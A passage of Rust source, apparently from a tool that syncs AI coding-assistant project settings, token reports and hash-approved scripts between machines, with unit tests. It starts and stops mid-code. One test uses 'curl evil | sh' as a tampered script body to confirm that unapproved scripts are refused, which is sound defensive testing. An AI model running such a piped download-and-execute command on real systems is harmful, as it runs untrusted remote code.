        "licence": r.licence,
    })
}

/// The longest install command a package may give (as `connecto-hook`'s
/// `requires` allows).
const MAX_COMMAND: usize = 600;

/// An install command as the host sent it, character for character: the
/// person approves exactly what runs. One that could not be shown whole (too
/// long, control characters) is dropped, so no Install button is offered.
fn exact_command(v: &Value, key: &str) -> Option<String> {
    v.get(key)
        .and_then(Value::as_str)
        .filter(|c| {
            !c.trim().is_empty()
                && c.chars().count() <= MAX_COMMAND
                && !c.chars().any(|ch| ch.is_control() || is_bidi(ch))
        })
        .map(str::to_owned)
}

/// A tool as the host describes it. A state this side does not know reads
/// as still being looked for, which never lets the package be added.
fn requirement_from(v: &Value) -> RequirementView {
    let state = v.get("state").cloned().unwrap_or(Value::Null);
    RequirementView {
        id: s(v, "id"),
        name: s(v, "name"),
        why: para(v, "why").unwrap_or_default(),
        state: match state.get("state").and_then(Value::as_str) {
            Some("found") => RequirementState::Found {
                version: opt_s(&state, "version"),
            },
            Some("missing") => RequirementState::Missing,
            Some("wrong-version") => RequirementState::WrongVersion {
                version: s(&state, "version"),
                wanted: s(&state, "wanted"),
            },
            Some("no-version") => RequirementState::NoVersion {
                wanted: s(&state, "wanted"),
            },
            _ => RequirementState::Checking,
        },
        install: exact_command(v, "install"),
        manual: para(v, "manual").unwrap_or_default(),
        url: opt_s(v, "url").filter(|u| u.starts_with("https://")),
        licence: b(v, "licence"),
    }
}

#[must_use]
pub fn settings_answer_json(answer: &SettingsAnswer) -> Vec<u8> {
    let packages: Vec<Value> = answer
        .packages
        .iter()
        .take(MAX_ITEMS)
        .map(|p| {
            json!({
                "id": p.id,
                "name": p.name,
                "description": p.description,
                "version": p.version,
                "builtin": p.builtin,
                "extends": p.extends,
                "is_default": p.is_default,
                "has_claude": p.has_claude,
                "has_codex": p.has_codex,
                "errors": p.errors,
                "requires": p.requires.iter().take(MAX_ITEMS).map(requirement_json).collect::<Vec<_>>(),
            })
        })
        .collect();
    let project = answer.project.as_ref().map(|p| {
        let installed: Vec<Value> = p
            .status
            .packages
            .iter()
            .take(MAX_ITEMS)
            .map(|i| {
                json!({
                    "id": i.id,
                    "installed_version": i.installed_version,
                    "available_version": i.available_version,
                })
            })
            .collect();
        json!({
            "settings": settings_json(&p.settings),
            "status": {
                "state": install_state_json(&p.status.state),
                "packages": installed,
                "skipped_modified": p.status.skipped_modified,
                "warnings": p.status.warnings,
                "checked_ms": p.status.checked_ms,
                "restart_needed": p.status.restart_needed,
            },
        })
    });
    json!({
        "packages": packages,
        "default_package": answer.default_package,
        "project": project,
        "last_error": answer.last_error,
    })
    .to_string()
    .into_bytes()
}

fn opt_u32(v: &Value, key: &str) -> Option<u32> {
    opt_u(v, key).and_then(|n| u32::try_from(n).ok())
}

/// The answer, its project shown under `project_id` (the id this machine
/// knows the project by).
///
/// # Errors
/// When the answer is not JSON.
pub fn settings_answer_from(bytes: &[u8], project_id: &str) -> Result<SettingsAnswer, String> {
    let v = parse(bytes)?;
    let packages = list(&v, "packages")
        .map(|p| PackageItem {
            id: s(p, "id"),
            name: s(p, "name"),
            description: para(p, "description").unwrap_or_default(),
            version: u32_of(p, "version"),
            builtin: b(p, "builtin"),
            extends: opt_s(p, "extends"),
            is_default: b(p, "is_default"),
            has_claude: b(p, "has_claude"),
            has_codex: b(p, "has_codex"),
            errors: strings(p, "errors"),
            requires: list(p, "requires")
                .map(requirement_from)
                .filter(|r| !r.id.is_empty())
                .collect(),
        })
        .filter(|p| !p.id.is_empty())
        .collect();
    let tools_one_or_all = v
        .get("project")
        .and_then(|p| p.get("settings"))
        .is_some_and(|s| s.get("tool_list").is_none());
    let project = v.get("project").filter(|p| p.is_object()).and_then(|p| {
        let status = p.get("status").cloned().unwrap_or(Value::Null);
        Some(ProjectPackagesView {
            project_id: project_id.to_owned(),
            settings: settings_from(p.get("settings")?)?,
            status: ProjectPackages {
                state: install_state_from(status.get("state").unwrap_or(&Value::Null)),
                packages: list(&status, "packages")
                    .map(|i| InstalledPackage {
                        id: s(i, "id"),
                        installed_version: opt_u32(i, "installed_version"),
                        available_version: opt_u32(i, "available_version"),
                    })
                    .collect(),
                skipped_modified: strings(&status, "skipped_modified"),
                warnings: strings(&status, "warnings"),
                checked_ms: opt_u(&status, "checked_ms"),
                restart_needed: b(&status, "restart_needed"),
            },
        })
    });
    Ok(SettingsAnswer {
        packages,
        default_package: opt_s(&v, "default_package"),
        project,
        last_error: opt_s(&v, "last_error"),
        tools_one_or_all,
    })
}

// ---- tokens ----

const fn kind_word(kind: ProposalKind) -> &'static str {
    match kind {
        ProposalKind::Plugin => "plugin",
        ProposalKind::Skill => "skill",
        ProposalKind::McpServer => "mcp-server",
        ProposalKind::MemoryFile => "memory-file",
    }
}

fn kind_from(word: &str) -> Option<ProposalKind> {
    Some(match word {
        "plugin" => ProposalKind::Plugin,
        "skill" => ProposalKind::Skill,
        "mcp-server" => ProposalKind::McpServer,
        "memory-file" => ProposalKind::MemoryFile,
        _ => return None,
    })
}

fn report_json(r: &TokenReport) -> Value {
    let t = &r.totals;
    let mut map = Map::new();
    map.insert("analyzed_ms".into(), json!(r.analyzed_ms));
    map.insert(
        "totals".into(),
        json!({
            "sessions": t.sessions,
            "calls": t.calls,
            "cache_read_share": t.cache_read_share,
            "median_context": t.median_context,
            "median_start_context": t.median_start_context,
            "reads_above_200k": t.reads_above_200k,
            "cold_rebuilds": t.cold_rebuilds,
            "compactions": t.compactions,
            "cost_reads": t.cost_reads,
            "cost_writes": t.cost_writes,
            "cost_output": t.cost_output,
            "cost_input": t.cost_input,
            "limited": t.limited,
        }),
    );
    map.insert(
        "loaded".into(),
        r.loaded.as_ref().map_or(Value::Null, |l| {
            json!({
                "skills": l.skills, "skill_tokens": l.skill_tokens,
                "mcp_tools": l.mcp_tools, "mcp_tokens": l.mcp_tokens,
                "agents": l.agents, "agent_tokens": l.agent_tokens,
                "memory_files": l.memory_files, "memory_tokens": l.memory_tokens,
            })
        }),
    );
    let proposals: Vec<Value> = r
        .proposals
        .iter()
        .take(MAX_ITEMS)
        .map(|p| {
            json!({
                "kind": kind_word(p.kind),
                "name": p.name,
                "ids": p.ids,
                "tokens": p.tokens,
                "evidence": p.evidence,
                "preselected": p.preselected,
                "hint": p.hint,
            })
        })
        .collect();
    map.insert("proposals".into(), Value::Array(proposals));
    let savings: Vec<Value> = r
        .compact
        .savings
        .iter()
        .map(|(tokens, share)| json!([tokens, share]))
        .collect();
    map.insert(
        "compact".into(),
        json!({ "reads_above_200k": r.compact.reads_above_200k, "savings": savings }),
    );
    map.insert(
        "after".into(),
        r.after.as_ref().map_or(Value::Null, |a| {
            let confirmation = match &a.confirmation {
                Confirmation::NotYet => json!({ "state": "not-yet" }),
                Confirmation::Confirmed => json!({ "state": "confirmed" }),
                Confirmation::StillLoaded(names) => {
                    json!({ "state": "still-loaded", "names": names })
                }
                Confirmation::NotRecorded => json!({ "state": "not-recorded" }),
            };
            json!({
                "sessions": a.sessions,
                "start_context_median": a.start_context_median,
                "confirmation": confirmation,
            })
        }),
    );
    map.insert("biggest".into(), json!(r.biggest));
    object(map)
}

fn report_from(v: &Value) -> TokenReport {
    let t = v.get("totals").cloned().unwrap_or(Value::Null);
    let loaded = v.get("loaded").filter(|l| l.is_object()).map(|l| Loaded {
        skills: n(l, "skills"),
        skill_tokens: u(l, "skill_tokens"),
        mcp_tools: n(l, "mcp_tools"),
        mcp_tokens: u(l, "mcp_tokens"),
        agents: n(l, "agents"),
        agent_tokens: u(l, "agent_tokens"),
        memory_files: n(l, "memory_files"),
        memory_tokens: u(l, "memory_tokens"),
    });
    let proposals = list(v, "proposals")
        .filter_map(|p| {
            Some(Proposal {
                kind: kind_from(p.get("kind")?.as_str()?)?,
                name: s(p, "name"),
                ids: raw_strings(p.get("ids")),
                tokens: u(p, "tokens"),
                evidence: para(p, "evidence").unwrap_or_default(),
                preselected: b(p, "preselected"),
                hint: para(p, "hint"),
            })
        })
        .collect();
    let compact = v.get("compact").cloned().unwrap_or(Value::Null);
    let savings = list(&compact, "savings")
        .filter_map(|pair| {
            let pair = pair.as_array()?;
            let tokens = u32::try_from(pair.first()?.as_u64()?).ok()?;
            let share = pair.get(1)?.as_f64().filter(|x| x.is_finite())?;
            Some((tokens, share))
        })
        .collect();
    let after = v.get("after").filter(|a| a.is_object()).map(|a| {
        let c = a.get("confirmation").cloned().unwrap_or(Value::Null);
        After {
            sessions: n(a, "sessions"),
            start_context_median: opt_u(a, "start_context_median"),
            confirmation: match c.get("state").and_then(Value::as_str) {
                Some("confirmed") => Confirmation::Confirmed,
                Some("still-loaded") => Confirmation::StillLoaded(strings(&c, "names")),
                Some("not-recorded") => Confirmation::NotRecorded,
                _ => Confirmation::NotYet,
            },
        }
    });
    TokenReport {
        analyzed_ms: u(v, "analyzed_ms"),
        totals: Totals {
            sessions: n(&t, "sessions"),
            calls: n(&t, "calls"),
            cache_read_share: f(&t, "cache_read_share"),
            median_context: u(&t, "median_context"),
            median_start_context: u(&t, "median_start_context"),
            reads_above_200k: f(&t, "reads_above_200k"),
            cold_rebuilds: n(&t, "cold_rebuilds"),
            compactions: n(&t, "compactions"),
            cost_reads: f(&t, "cost_reads"),
            cost_writes: f(&t, "cost_writes"),
            cost_output: f(&t, "cost_output"),
            cost_input: f(&t, "cost_input"),
            limited: opt_s(&t, "limited"),
        },
        loaded,
        proposals,
        compact: CompactEstimate {
            reads_above_200k: f(&compact, "reads_above_200k"),
            savings,
        },
        after,
        biggest: opt_s(v, "biggest"),
    }
}

#[must_use]
pub fn tokens_answer_json(answer: &TokensAnswer) -> Vec<u8> {
    let project = answer.project.as_ref().map(|p| {
        let st = &p.settings;
        let study = match &p.study {
            StudyState::NotRun => json!({ "state": "not-run" }),
            StudyState::Running => json!({ "state": "running" }),
            StudyState::Done(findings) => {
                let findings: Vec<Value> = findings
                    .iter()
                    .take(MAX_ITEMS)
                    .map(
                        |f| json!({ "title": f.title, "evidence": f.evidence, "advice": f.advice }),
                    )
                    .collect();
                json!({ "state": "done", "findings": findings })
            }
            StudyState::Unavailable(why) => json!({ "state": "unavailable", "why": why }),
        };
        json!({
            "settings": {
                "plugins_off": st.plugins_off,
                "skills_off": st.skills_off,
                "autocompact": st.autocompact,
                "applied_at": st.applied_at,
                "before": st.before.map(|b| json!({
                    "start_context_median": b.start_context_median,
                    "sessions": b.sessions,
                })),
            },
            "busy": p.busy,
            "report": p.report.as_ref().map(report_json),
            "study": study,
            "error": p.error,
        })
    });
    json!({ "available": answer.available, "project": project })
        .to_string()
        .into_bytes()
}

/// The answer, its project shown under `project_id`.
///
/// # Errors
/// When the answer is not JSON.
pub fn tokens_answer_from(bytes: &[u8], project_id: &str) -> Result<TokensAnswer, String> {
    let v = parse(bytes)?;
    let project = v.get("project").filter(|p| p.is_object()).map(|p| {
        let st = p.get("settings").cloned().unwrap_or(Value::Null);
        let study = p.get("study").cloned().unwrap_or(Value::Null);
        ProjectTokenView {
            project_id: project_id.to_owned(),
            settings: TokenSettings {
                plugins_off: raw_strings(st.get("plugins_off")),
                skills_off: raw_strings(st.get("skills_off")),
                autocompact: opt_u32(&st, "autocompact"),
                applied_at: opt_s(&st, "applied_at"),
                before: st.get("before").filter(|b| b.is_object()).map(|b| Before {
                    start_context_median: u(b, "start_context_median"),
                    sessions: u32_of(b, "sessions"),
                }),
            },
            busy: opt_s(p, "busy"),
            report: p.get("report").filter(|r| r.is_object()).map(report_from),
            study: match study.get("state").and_then(Value::as_str) {
                Some("running") => StudyState::Running,
                Some("done") => StudyState::Done(
                    list(&study, "findings")
                        .map(|f| StudyFinding {
                            title: s(f, "title"),
                            evidence: para(f, "evidence").unwrap_or_default(),
                            advice: para(f, "advice").unwrap_or_default(),
                        })
                        .collect(),
                ),
                Some("unavailable") => StudyState::Unavailable(s(&study, "why")),
                _ => StudyState::NotRun,
            },
            error: opt_s(p, "error"),
        }
    });
    Ok(TokensAnswer {
        available: b(&v, "available"),
        project,
    })
}

// ---- operations ----

/// Room kept in an answer for the JSON around the operations.
const OPS_PAGE_SLACK: usize = 1024;
/// The most operations a project has, so the most a peer takes in one
/// view, all pages together.
const MAX_OPS: usize = connecto_ops::folder::MAX_OPS;

/// What a peer shows for an operation that came without its files whole.
const NOT_WHOLE: &str = "Its files did not arrive whole from that machine. Open Project Settings > Operations again, or there.";

/// A hash an approval or a run may name: 64 lowercase hex digits.
fn is_hash(hash: &str) -> bool {
    hash.len() == 64
        && hash
            .bytes()
            .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
}

fn ops_action_json(action: &OpsAction) -> Value {
    match action {
        OpsAction::Approve { slug, hash } => json!({ "do": "approve", "slug": slug, "hash": hash }),
        OpsAction::Withdraw(slug) => json!({ "do": "withdraw", "slug": slug }),
        OpsAction::Delete(slug) => json!({ "do": "delete", "slug": slug }),
        OpsAction::SetIntercept(slug, on) => json!({ "do": "intercept", "slug": slug, "on": on }),
        OpsAction::Run { slug, hash, args } => {
            json!({ "do": "run", "slug": slug, "hash": hash, "args": args })
        }
        OpsAction::Fix(slug) => json!({ "do": "fix", "slug": slug }),
        OpsAction::Discover => json!({ "do": "discover" }),
        OpsAction::Later => json!({ "do": "later" }),
        OpsAction::SetHook(mode) => json!({ "do": "hook", "mode": mode.word() }),
        OpsAction::SetWeekly(on) => json!({ "do": "weekly", "on": on }),
    }
}

/// A peer's action, all of it or nothing: a slug that cannot name an
/// operation, a hash that is not one, or an argument that is not text is
/// refused, never cut.
fn ops_action_from(v: &Value) -> Option<OpsAction> {
    let slug = || {
        v.get("slug")
            .and_then(Value::as_str)
            .filter(|slug| connecto_ops::spec::valid_slug(slug))
            .map(str::to_owned)
    };
    let hash = || {
        v.get("hash")
            .and_then(Value::as_str)
            .filter(|hash| is_hash(hash))
            .map(str::to_owned)
    };
    let on = || v.get("on").and_then(Value::as_bool);
    Some(match v.get("do")?.as_str()? {
        "approve" => OpsAction::Approve {
            slug: slug()?,
            hash: hash()?,
        },
        "withdraw" => OpsAction::Withdraw(slug()?),
        "delete" => OpsAction::Delete(slug()?),
        "intercept" => OpsAction::SetIntercept(slug()?, on()?),
        // The arguments are checked where the host checks its own dialog's
        // (how many the operation takes); here only that they are text. The
        // ask's own limit bounds their size.
        "run" => {
            let args = v
                .get("args")?
                .as_array()?
                .iter()
                .map(|a| a.as_str().map(str::to_owned))
                .collect::<Option<Vec<String>>>()?;
            OpsAction::Run {
                slug: slug()?,
                hash: hash()?,
                args,
            }
        }
        "fix" => OpsAction::Fix(slug()?),
        "discover" => OpsAction::Discover,
        "later" => OpsAction::Later,
        "hook" => OpsAction::SetHook(HookMode::from_word(v.get("mode")?.as_str()?)?),
        "weekly" => OpsAction::SetWeekly(on()?),
        _ => return None,
    })
}

fn standing_json(standing: &OpStanding) -> Value {
    match standing {
        OpStanding::Approved => json!({ "state": "approved" }),
        OpStanding::Proposed => json!({ "state": "proposed" }),
        OpStanding::Changed => json!({ "state": "changed" }),
        OpStanding::Invalid(why) => json!({ "state": "invalid", "why": why }),
    }
}

fn op_row_json(op: &OpRow) -> Value {
    let stats = &op.stats;
    json!({
        "slug": op.slug,
        "name": op.name,
        "standing": standing_json(&op.standing),
        "intercept": op.intercept,
        "spec": op.spec,
        "body": op.body,
        "hash": op.hash,
        "stats": {
            "runs": stats.runs,
            "failures": stats.failures,
            "average_ms": stats.average_ms,
            "last": stats.last.as_ref().map(|(at, outcome)| json!({ "at": at, "outcome": outcome })),
            "by_agent": stats.by_agent,
            "suggested": stats.suggested,
            "intercepted": stats.intercepted,
        },
    })
}

/// One page of the view: the operations whose slug comes after `after`, in
/// slug order, each with its two files exactly as read, as many as fit in
/// one answer measured as sent (escaped JSON), and at least one; `more` says
/// some were left for the next page. A cursor by slug, not by position, so
/// an operation removed between pages moves none of the others.
#[must_use]
pub fn ops_view_json(view: &OpsView, after: Option<&str>) -> Vec<u8> {
    let header = |ops: Vec<Value>, more: bool| {
        json!({
            "available": view.available,
            "unavailable": view.unavailable,
            "ops": ops,
            "more": more,
            "hook": view.hook.word(),
            "weekly": view.weekly,
            "suggest_discovery": view.suggest_discovery,
            "discovery_terminal": view.discovery_terminal,
            "last_discovery_ms": view.last_discovery_ms,
            "prompts_since_discovery": view.prompts_since_discovery,
            "jev": view.jev,
            "notice": view.notice.as_ref().map(|(text, error)| json!({ "text": text, "error": error })),
        })
    };
    let max = usize::try_from(MAX_ANSWER).unwrap_or(usize::MAX);
    let mut used = header(Vec::new(), true).to_string().len() + OPS_PAGE_SLACK;
    let mut rows: Vec<&OpRow> = view
        .ops
        .iter()
        .filter(|op| after.is_none_or(|after| op.slug.as_str() > after))
        .collect();
    rows.sort_by(|a, b| a.slug.cmp(&b.slug));
    let mut page = Vec::new();
    let mut more = false;
    for op in rows {
        let row = op_row_json(op);
        // Its size as it goes out, with the comma before it.
        let size = row.to_string().len() + 1;
        if !page.is_empty() && used + size > max {
            more = true;
            break;
        }
        used += size;
        page.push(row);
    }
    header(page, more).to_string().into_bytes()
}

/// One operation as the host sent it. What it shows of the operation (its
/// name, kind, arguments, script) is read from the files it came with, and
/// the hash it approves or runs is the one of those exact bytes: a row whose
/// files do not give the host's hash is shown as invalid, with no hash, so
/// nothing can be approved or run from it.
fn op_row_from(v: &Value) -> Option<OpRow> {
    let slug = v
        .get("slug")
        .and_then(Value::as_str)
        .filter(|slug| connecto_ops::spec::valid_slug(slug))?
        .to_owned();
    let st = v.get("stats").cloned().unwrap_or(Value::Null);
    let stats = OpStats {
        runs: u32_of(&st, "runs"),
        failures: u32_of(&st, "failures"),
        average_ms: u(&st, "average_ms"),
        last: st
            .get("last")
            .filter(|l| l.is_object())
            .map(|l| (u(l, "at"), s(l, "outcome"))),
        by_agent: u32_of(&st, "by_agent"),
        suggested: u32_of(&st, "suggested"),
        intercepted: u32_of(&st, "intercepted"),
    };
    let standing_v = v.get("standing").cloned().unwrap_or(Value::Null);
    let standing = match standing_v.get("state").and_then(Value::as_str) {
        Some("approved") => OpStanding::Approved,
        Some("proposed") => OpStanding::Proposed,
        Some("changed") => OpStanding::Changed,
        Some("invalid") => {
            OpStanding::Invalid(para(&standing_v, "why").unwrap_or_else(|| "invalid".to_owned()))
        }
        _ => return None,
    };
    let bare = |standing: OpStanding| OpRow {
        name: slug.clone(),
        slug: slug.clone(),
        description: String::new(),
        kind: None,
        danger: None,
        asks_first: true,
        standing,
        intercept: false,
        phrases: Vec::new(),
        args: Vec::new(),
        body: String::new(),
        spec: String::new(),
        hash: String::new(),
        timeout_s: connecto_ops::spec::DEFAULT_TIMEOUT_S,
        stats: stats.clone(),
    };
    if matches!(standing, OpStanding::Invalid(_)) {
        return Some(bare(standing));
    }
    let text = |key: &str| v.get(key).and_then(Value::as_str).unwrap_or("");
    let sent_hash = text("hash");
    let loaded = match connecto_ops::folder::checked(text("spec"), text("body")) {
        Ok(loaded) if loaded.hash == sent_hash => loaded,
        _ => return Some(bare(OpStanding::Invalid(NOT_WHOLE.to_owned()))),
    };
    Some(OpRow {
        slug,
        name: loaded.spec.name.clone(),
        description: loaded.spec.description.clone(),
        kind: Some(loaded.spec.kind),
        danger: Some(loaded.spec.danger),
        asks_first: loaded.spec.asks_first(),
        standing,
        intercept: b(v, "intercept"),
        phrases: loaded.spec.phrases.clone(),
        args: loaded.spec.args.clone(),
        timeout_s: loaded.spec.timeout_s,
        body: loaded.body,
        spec: loaded.spec_text,
        hash: loaded.hash,
        stats,
    })
}

/// The whole view, its project shown under `project_id`, read page by page
/// with `ask` (the host's answer to one ask), each page after the last slug
/// of the one before. A host that sends more operations than a project has,
/// or a page out of slug order or empty while it says there is more, is
/// refused: nothing it sends can make this side read without end.
///
/// # Errors
/// `ask`'s error, an answer that is not JSON, or one refused as above.
pub fn fetch_ops_view(
    mut ask: impl FnMut(&ProjectAsk) -> Result<Vec<u8>, String>,
    project_id: &str,
) -> Result<OpsView, String> {
    let bad = |why: &str| format!("that machine sent its operations {why}");
    let (mut view, mut more) = ops_page_from(&ask(&ProjectAsk::Ops { after: None })?, project_id)?;
    if !ascending(&view.ops, None) {
        return Err(bad("out of order"));
    }
    while more {
        let after = view.ops.last().map(|op| op.slug.clone());
        if after.is_none() {
            return Err(bad("as an empty page with more to come"));
        }
        let (page, next) = ops_page_from(
            &ask(&ProjectAsk::Ops {
                after: after.clone(),
            })?,
            project_id,
        )?;
        if page.ops.is_empty() && next {
            return Err(bad("as an empty page with more to come"));
        }
        if !ascending(&page.ops, after.as_deref()) {
            return Err(bad("out of order"));
        }
        if view.ops.len() + page.ops.len() > MAX_OPS {
            return Err(bad("past what a project holds"));
        }
        view.ops.extend(page.ops);
        more = next;
    }
    Ok(view)
}

/// Each slug comes after the one before, the first after `after`.
fn ascending(ops: &[OpRow], after: Option<&str>) -> bool {
    let mut last = after;
    for op in ops {
        if last.is_some_and(|last| op.slug.as_str() <= last) {
            return false;
        }
        last = Some(op.slug.as_str());
    }
    true
}

/// One page of the view, its project shown under `project_id`, and whether
/// more follow.
///
/// # Errors
/// When the answer is not JSON, or holds more operations than a project.
pub fn ops_page_from(bytes: &[u8], project_id: &str) -> Result<(OpsView, bool), String> {
    let v = parse(bytes)?;
    if v.get("ops")
        .and_then(Value::as_array)
        .is_some_and(|ops| ops.len() > MAX_OPS)
    {
        return Err("that machine sent its operations past what a project holds".to_owned());
    }
    let next = b(&v, "more");
    Ok((
        OpsView {
            project: project_id.to_owned(),
            available: b(&v, "available"),
            unavailable: para(&v, "unavailable"),
            ops: list(&v, "ops").filter_map(op_row_from).collect(),
            hook: v
                .get("hook")
                .and_then(Value::as_str)
                .and_then(HookMode::from_word)
                .unwrap_or_default(),
            weekly: b(&v, "weekly"),
            suggest_discovery: b(&v, "suggest_discovery"),
            discovery_terminal: opt_s(&v, "discovery_terminal"),
            last_discovery_ms: opt_u(&v, "last_discovery_ms"),
            prompts_since_discovery: u32_of(&v, "prompts_since_discovery"),
            jev: b(&v, "jev"),
            notice: v
                .get("notice")
                .filter(|n| n.is_object())
                .and_then(|n| para(n, "text").map(|text| (text, b(n, "error")))),
        },
        next,
    ))
}

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod tests {
    use super::*;
    use connecto_core::ToolKind;

    #[test]
    fn every_ask_reads_back_as_it_was_sent() {
        let asks = [
            ProjectAsk::History,
            ProjectAsk::Transcript {
                history: "h1".into(),
            },
            ProjectAsk::Continue {
                history: "h2".into(),
            },
            ProjectAsk::Settings,
            ProjectAsk::SetSettings(ProjectSettings {
                tools: ProjectTools::Claude,
                claude_config: ConfigMode::Isolated,
                packages: vec!["a".into(), "b".into()],
                ..ProjectSettings::default()
            }),
            ProjectAsk::Refresh,
            ProjectAsk::CheckRequirements {
                package: "game-dev".into(),
            },
            ProjectAsk::InstallRequirement {
                package: "game-dev".into(),
                requirement: "godot".into(),
                command: format!("brew install {}", "x".repeat(587)),
            },
            ProjectAsk::Tokens,
            ProjectAsk::TokensAnalyze,
            ProjectAsk::TokensApply {
                plugins: vec!["p@synced".into()],
                skills: vec!["s".into()],
            },
            ProjectAsk::TokensUndo,
            ProjectAsk::TokensAutocompact(Some(200_000)),
            ProjectAsk::TokensAutocompact(None),
            ProjectAsk::Ops { after: None },
            ProjectAsk::Ops {
                after: Some("op-7".into()),
            },
            ProjectAsk::FunctionalMemory,
            ProjectAsk::FunctionalMemoryUpdate,
            ProjectAsk::FunctionalMemorySet {
                auto: Some(false),
                model: None,
            },
            ProjectAsk::FunctionalMemorySet {
                auto: None,
                model: Some(None),
            },
            ProjectAsk::FunctionalMemorySet {
                auto: None,
                model: Some(Some(FmModel::new(
                    connecto_core::memory::Provider::Codex,
                    "gpt-6.2-sol",
                ))),
            },
        ]
        .into_iter()
        .chain(
            [
                OpsAction::Approve {
                    slug: "tests".into(),
                    hash: "a".repeat(64),
                },
                OpsAction::Withdraw("tests".into()),
                OpsAction::Delete("tests".into()),
                OpsAction::SetIntercept("tests".into(), true),
                OpsAction::Run {
                    slug: "deploy-2".into(),
                    hash: "0f".repeat(32),
                    args: vec!["main".into(), "with space".into(), "x".repeat(5000)],
                },
                OpsAction::Fix("tests".into()),
                OpsAction::Discover,
                OpsAction::Later,
                OpsAction::SetHook(HookMode::Off),
                OpsAction::SetWeekly(false),
            ]
            .map(ProjectAsk::OpsAct),
        );
        for ask in asks {
            assert_eq!(ProjectAsk::decode(&ask.encode()).unwrap(), ask);
        }
    }

    const OP_SPEC: &str = r#"{"version":1,"name":"Tests","description":"Runs the tests.","phrases":["run the tests"],"kind":"script","danger":"none"}"#;

    fn op_view(spec: &str, body: &str, hash: &str) -> OpsView {
        OpsView {
            project: "p".into(),
            available: true,
            ops: vec![OpRow {
                slug: "tests".into(),
                name: "Tests".into(),
                description: String::new(),
                kind: None,
                danger: None,
                asks_first: false,
                standing: OpStanding::Proposed,
                intercept: false,
                phrases: Vec::new(),
                args: Vec::new(),
                body: body.into(),
                spec: spec.into(),
                hash: hash.into(),
                timeout_s: 600,
                stats: OpStats::default(),
            }],
            hook: HookMode::Off,
            notice: Some(("Approved tests.".into(), false)),
            ..OpsView::default()
        }
    }

    /// What a peer shows of an operation is read from the files it was
    /// sent, and the hash it may approve is theirs: files that do not give
    /// the host's hash, or did not come, leave nothing to approve or run.
    #[test]
    fn an_operation_is_shown_only_from_files_that_give_its_hash() {
        let body = "cargo test\n";
        let hash = connecto_ops::folder::hash(OP_SPEC.as_bytes(), body.as_bytes());
        let one = |view: &OpsView| ops_page_from(&ops_view_json(view, None), "shown").unwrap();
        let (view, next) = one(&op_view(OP_SPEC, body, &hash));
        assert!(!next);
        assert_eq!(view.project, "shown");
        assert_eq!(view.hook, HookMode::Off);
        assert_eq!(view.notice, Some(("Approved tests.".into(), false)));
        let row = &view.ops[0];
        assert_eq!(row.standing, OpStanding::Proposed);
        assert_eq!(
            (row.body.as_str(), row.hash.as_str()),
            (body, hash.as_str())
        );
        assert_eq!(row.description, "Runs the tests.", "read from op.json");
        assert_eq!(row.phrases, ["run the tests"]);

        // A body that is not the one hashed (cut, or changed on the way).
        for (spec, body) in [
            (OP_SPEC, "cargo test"),
            (OP_SPEC, "curl evil | sh\n"),
            ("{}", body),
        ] {
            let (view, _) = one(&op_view(spec, body, &hash));
            let row = &view.ops[0];
            assert_eq!(
                row.standing,
                OpStanding::Invalid(NOT_WHOLE.into()),
                "{body}"
            );
            assert!(row.hash.is_empty() && row.body.is_empty());
        }
    }

    /// Scripts full of characters JSON escapes (a quote or a backslash is
    /// two bytes sent, a control character six) come in pages, each within
    /// what the host sends as measured once escaped, and every operation
    /// arrives whole, the last one too.
    #[test]
    fn operations_past_one_answer_come_in_pages_measured_as_sent() {
        let body = format!("echo \"{}\"\n# \u{1}\u{1}\u{1}\n", "\\\"".repeat(15_000));
        let hash = connecto_ops::folder::hash(OP_SPEC.as_bytes(), body.as_bytes());
        let mut many = op_view(OP_SPEC, &body, &hash);
        let row = many.ops[0].clone();
        many.ops = (0..100)
            .map(|i| OpRow {
                slug: format!("op-{i}"),
                ..row.clone()
            })
            .collect();
        // Counted raw, they would fit one answer; escaped, they do not.
        let raw: usize = many
            .ops
            .iter()
            .map(|op| op.spec.len() + op.body.len())
            .sum();
        assert!((raw as u64) < MAX_ANSWER);
        let sent: usize = many
            .ops
            .iter()
            .map(|op| op_row_json(op).to_string().len())
            .sum();
        assert!(sent as u64 > MAX_ANSWER, "{sent}");
        let mut pages = 0;
        let view = fetch_ops_view(
            |ask| {
                let ProjectAsk::Ops { after } = ask else {
                    return Err(format!("not a page: {ask:?}"));
                };
                pages += 1;
                let bytes = ops_view_json(&many, after.as_deref());
                assert!(
                    bytes.len() as u64 <= MAX_ANSWER,
                    "page {pages}: {}",
                    bytes.len()
                );
                Ok(bytes)
            },
            "p",
        )
        .unwrap();
        assert!(pages >= 2, "{pages}");
        assert_eq!(view.ops.len(), 100);
        assert!(view.ops.iter().all(|op| op.hash == hash && op.body == body));
        assert_eq!(view.ops[99].slug, "op-99");
        assert_eq!(view.ops[99].standing, OpStanding::Proposed);
    }

    /// `n` operations of `body`, slugs `op-000` on.
    fn ops_of(n: usize, body: &str) -> OpsView {
        let hash = connecto_ops::folder::hash(OP_SPEC.as_bytes(), body.as_bytes());
        let mut view = op_view(OP_SPEC, body, &hash);
        let row = view.ops[0].clone();
        view.ops = (0..n)
            .map(|i| OpRow {
                slug: format!("op-{i:03}"),
                ..row.clone()
            })
            .collect();
        view
    }

    /// An answer for `after`, read as JSON to be bent.
    fn page_json(view: &OpsView, after: Option<&str>) -> Value {
        serde_json::from_slice(&ops_view_json(view, after)).unwrap()
    }

    /// A host may send no more operations than a project has, on one page
    /// or over several, nor pages out of order or that never end: each is
    /// refused, not read on.
    #[test]
    fn a_host_that_sends_more_operations_than_a_project_has_is_refused() {
        let body = "cargo test\n";
        // One page past the limit, the first one too.
        let over = ops_of(MAX_OPS + 1, body);
        let err = fetch_ops_view(|_| Ok(ops_view_json(&over, None)), "p").unwrap_err();
        assert!(err.contains("past what a project holds"), "{err}");

        // Pages that each fit, past it together.
        let mut asked = 0;
        let err = fetch_ops_view(
            |ask| {
                let ProjectAsk::Ops { after } = ask else {
                    return Err("not a page".into());
                };
                asked += 1;
                let mut page = if after.is_none() {
                    page_json(&ops_of(60, body), None)
                } else {
                    let mut later = ops_of(120, body);
                    later.ops.drain(..60);
                    page_json(&later, None)
                };
                page["more"] = json!(true);
                Ok(page.to_string().into_bytes())
            },
            "p",
        )
        .unwrap_err();
        assert!(err.contains("past what a project holds"), "{err}");
        assert_eq!(asked, 2, "refused at the page that passed it");

        // The same page again and again (out of order), or an empty one
        // that says more follow.
        let same = {
            let mut page = page_json(&ops_of(3, body), None);
            page["more"] = json!(true);
            page.to_string().into_bytes()
        };
